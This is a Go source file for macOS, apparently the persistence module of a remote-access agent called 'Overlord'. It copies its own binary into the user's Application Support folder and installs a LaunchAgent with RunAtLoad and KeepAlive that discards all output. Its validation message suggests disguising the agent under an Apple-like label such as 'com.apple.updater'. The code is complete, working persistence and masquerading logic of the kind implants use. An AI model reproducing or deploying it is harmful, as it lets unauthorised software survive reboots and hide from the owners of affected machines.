//go:build darwin && !ios && !ios_target

package persistence

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"text/template"
)

var currentUserHomeDir = func() (string, error) {
	usr, err := user.Current()
	if err != nil {
		return "", err
	}
	if usr.HomeDir == "" {
		return "", fmt.Errorf("current user home directory is empty")
	}
	return usr.HomeDir, nil
}

const launchAgentPlist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>{{.Label}}</string>
	<key>ProgramArguments</key>
	<array>
		<string>{{.ExePath}}</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
	<key>StandardOutPath</key>
	<string>/dev/null</string>
	<key>StandardErrorPath</key>
	<string>/dev/null</string>
</dict>
</plist>
`

func launchctlLoad(plistPath string) {
	_ = exec.Command("launchctl", "load", "-w", plistPath).Run()
}

func launchctlUnload(plistPath string) {
	_ = exec.Command("launchctl", "unload", plistPath).Run()
}

func binaryName() string {
	if DefaultStartupName != "" {
		return DefaultStartupName
	}
	return "agent"
}

func plistLabel() string {
	if DefaultStartupName != "" {
		return DefaultStartupName
	}
	return "com.overlord.agent"
}

func validateStartupName() error {
	if DefaultStartupName != "" && !strings.HasPrefix(DefaultStartupName, "com.") {
		return fmt.Errorf("startup name %q is invalid for macOS: LaunchAgent labels must start with \"com.\" (e.g. com.apple.updater)", DefaultStartupName)
	}
	return nil
}

func getPlistPath() (string, error) {
	homeDir, err := currentUserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homeDir, "Library", "LaunchAgents", plistLabel()+".plist"), nil
}

func getTargetPath() (string, error) {
	if err := validateStartupName(); err != nil {
		return "", err
	}

	homeDir, err := currentUserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homeDir, "Library", "Application Support", "Overlord", binaryName()), nil
}

func install(exePath string) error {

	if err := validateStartupName(); err != nil {
		return err
	}

	targetPath, err := getTargetPath()
	if err != nil {
		return fmt.Errorf("failed to get target path: %w", err)
	}

	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create Overlord directory: %w", err)
	}

	if err := replaceExecutable(exePath, targetPath); err != nil {
		return err
	}

	plistPath, err := getPlistPath()
	if err != nil {
		return fmt.Errorf("failed to get plist path: %w", err)
	}

	launchAgentsDir := filepath.Dir(plistPath)
	if err := os.MkdirAll(launchAgentsDir, 0755); err != nil {
		return fmt.Errorf("failed to create LaunchAgents directory: %w", err)
	}

	file, err := os.Create(plistPath)
	if err != nil {
		return fmt.Errorf("failed to create plist file: %w", err)
	}

	tmpl, err := template.New("plist").Parse(launchAgentPlist)
	if err != nil {
		_ = file.Close()
		return fmt.Errorf("failed to parse template: %w", err)
	}

	data := struct {
		Label   string
		ExePath string
	}{
		Label:   plistLabel(),
		ExePath: targetPath,
	}

	if err := tmpl.Execute(file, data); err != nil {
		_ = file.Close()
		return fmt.Errorf("failed to write plist file: %w", err)
	}
	if err := file.Close(); err != nil {
		return fmt.Errorf("failed to close plist file: %w", err)
	}

	launchctlLoad(plistPath)
	return nil
}

func replaceExecutable(exePath, targetPath string) error {
	srcFile, err := os.Open(exePath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer srcFile.Close()

	dir := filepath.Dir(targetPath)
	tmpFile, err := os.CreateTemp(dir, "agent-*.tmp")
	if err != nil {
		return fmt.Errorf("failed to create temp executable: %w", err)
	}
	tmpPath := tmpFile.Name()
	defer func() {
		_ = tmpFile.Close()
		_ = os.Remove(tmpPath)
	}()

	if _, err := io.Copy(tmpFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable: %w", err)
	}
	if err := tmpFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync temp file: %w", err)
	}
	if err := tmpFile.Close(); err != nil {
		return fmt.Errorf("failed to close temp file: %w", err)
	}

	if err := os.Rename(tmpPath, targetPath); err != nil {
		if removeErr := os.Remove(targetPath); removeErr == nil {
			err = os.Rename(tmpPath, targetPath)
		}
		if err != nil {
			return fmt.Errorf("failed to replace executable at %s: %w", targetPath, err)
		}
	}

	if err := os.Chmod(targetPath, 0755); err != nil {
		return fmt.Errorf("failed to set executable permissions: %w", err)
	}

	return nil
}

func configure(exePath string) error {
	if err := validateStartupName(); err != nil {
		return err
	}

	plistPath, err := getPlistPath()
	if err != nil {
		return fmt.Errorf("failed to get plist path: %w", err)
	}

	launchAgentsDir := filepath.Dir(plistPath)
	if err := os.MkdirAll(launchAgentsDir, 0755); err != nil {
		return fmt.Errorf("failed to create LaunchAgents directory: %w", err)
	}

	// Unload before rewriting so launchd picks up the new binary path.
	launchctlUnload(plistPath)

	file, err := os.Create(plistPath)
	if err != nil {
		return fmt.Errorf("failed to create plist file: %w", err)
	}

	tmpl, err := template.New("plist").Parse(launchAgentPlist)
	if err != nil {
		_ = file.Close()
		return fmt.Errorf("failed to parse template: %w", err)
	}

	data := struct {
		Label   string
		ExePath string
	}{
		Label:   plistLabel(),
		ExePath: exePath,
	}

	if err := tmpl.Execute(file, data); err != nil {
		_ = file.Close()
		return fmt.Errorf("failed to execute template: %w", err)
	}
	if err := file.Close(); err != nil {
		return fmt.Errorf("failed to close plist file: %w", err)
	}

	launchctlLoad(plistPath)
	return nil
}

func uninstall() error {
	plistPath, err := getPlistPath()
	if err != nil {
		return fmt.Errorf("failed to get plist path: %w", err)
	}

	// Unload before deleting so launchd stops trying to restart the agent.
	launchctlUnload(plistPath)

	if err := os.Remove(plistPath); err != nil && !os.IsNotExist(err) {
		return fmt.Errorf("failed to remove plist file: %w", err)
	}

	if targetPath, err := getTargetPath(); err == nil {
		os.Remove(targetPath)
	}

	return nil
}

func removeCurrentInstall(currentExe string) error {
	currentExe = filepath.Clean(strings.TrimSpace(currentExe))
	if currentExe == "" {
		return nil
	}

	targetPath, err := getTargetPath()
	if err == nil && filepath.Clean(targetPath) == currentExe {
		return nil
	}

	plistPath, err := getPlistPath()
	if err != nil {
		return nil
	}
	if startupFileReferences(plistPath, currentExe) {
		if err := os.Remove(plistPath); err != nil && !os.IsNotExist(err) {
			return fmt.Errorf("failed to remove current plist file: %w", err)
		}
	}
	return nil
}

func startupFileReferences(path string, exePath string) bool {
	data, err := os.ReadFile(path)
	if err != nil {
		return false
	}
	return strings.Contains(string(data), "<string>"+exePath+"</string>")
}
